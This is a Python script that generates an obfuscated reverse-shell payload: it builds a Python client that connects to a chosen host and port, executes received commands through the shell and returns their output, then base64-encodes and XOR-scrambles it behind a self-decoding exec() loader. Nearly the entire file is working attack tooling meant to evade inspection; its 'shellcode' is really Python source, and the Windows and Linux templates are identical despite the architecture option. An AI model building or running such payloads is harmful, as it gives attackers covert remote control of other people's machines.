import argparse
import base64
import random
import string

# XOR encoding function for obfuscation
def xor_encode(data, key):
    return ''.join(chr(ord(c) ^ key) for c in data)

# Generate random string for the payload (template)
def random_string(length=16):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

# Function to generate shellcode template for Windows
def generate_shellcode_windows(host, port):
    template = f'''
import socket
import subprocess
import os

host = "{host}"
port = {port}

def create_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    while True:
        command = s.recv(1024)
        if command.decode("utf-8") == "exit":
            break
        result = subprocess.run(command, shell=True, capture_output=True)
        s.send(result.stdout + result.stderr)
    s.close()

if __name__ == "__main__":
    create_connection()
    '''
    return template

# Function to generate shellcode template for Linux
def generate_shellcode_linux(host, port):
    template = f'''
import socket
import subprocess
import os

host = "{host}"
port = {port}

def create_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    while True:
        command = s.recv(1024)
        if command.decode("utf-8") == "exit":
            break
        result = subprocess.run(command, shell=True, capture_output=True)
        s.send(result.stdout + result.stderr)
    s.close()

if __name__ == "__main__":
    create_connection()
    '''
    return template

# Function to obfuscate the shellcode using XOR and base64
def obfuscate_shellcode(shellcode):
    encoded = base64.b64encode(shellcode.encode()).decode()
    obfuscated = xor_encode(encoded, 123)  # Random XOR key for demonstration
    return obfuscated

# Main function to parse arguments and generate the shellcode
def main():
    parser = argparse.ArgumentParser(description="Generate obfuscated shellcode with remote shell capabilities.")
    parser.add_argument('--arch', required=True, choices=['x86', 'x64'], help="Target architecture")
    parser.add_argument('--platform', required=True, choices=['windows', 'linux'], help="Target platform")
    parser.add_argument('--host', required=True, help="Host IP address")
    parser.add_argument('--port', required=True, type=int, help="Target port")
    parser.add_argument('-o', '--output', required=True, help="Output file name")

    args = parser.parse_args()

    # Generate the shellcode based on platform
    if args.platform == 'windows':
        shellcode = generate_shellcode_windows(args.host, args.port)
    else:
        shellcode = generate_shellcode_linux(args.host, args.port)

    # Obfuscate the shellcode
    obfuscated_shellcode = obfuscate_shellcode(shellcode)

    # Save the obfuscated shellcode to the output file
    with open(args.output, 'w') as f:
        f.write(f"import base64\n")
        f.write(f"import os\n")
        f.write(f"def xor_encode(data, key):\n")
        f.write(f"    return ''.join(chr(ord(c) ^ key) for c in data)\n")  # Adding the XOR function
        f.write(f"shellcode = '''{obfuscated_shellcode}'''\n")
        f.write(f"shellcode = xor_encode(shellcode, 123)\n")
        f.write(f"exec(base64.b64decode(shellcode))\n")

    print(f"Obfuscated shellcode saved to {args.output}")

if __name__ == "__main__":
    main()
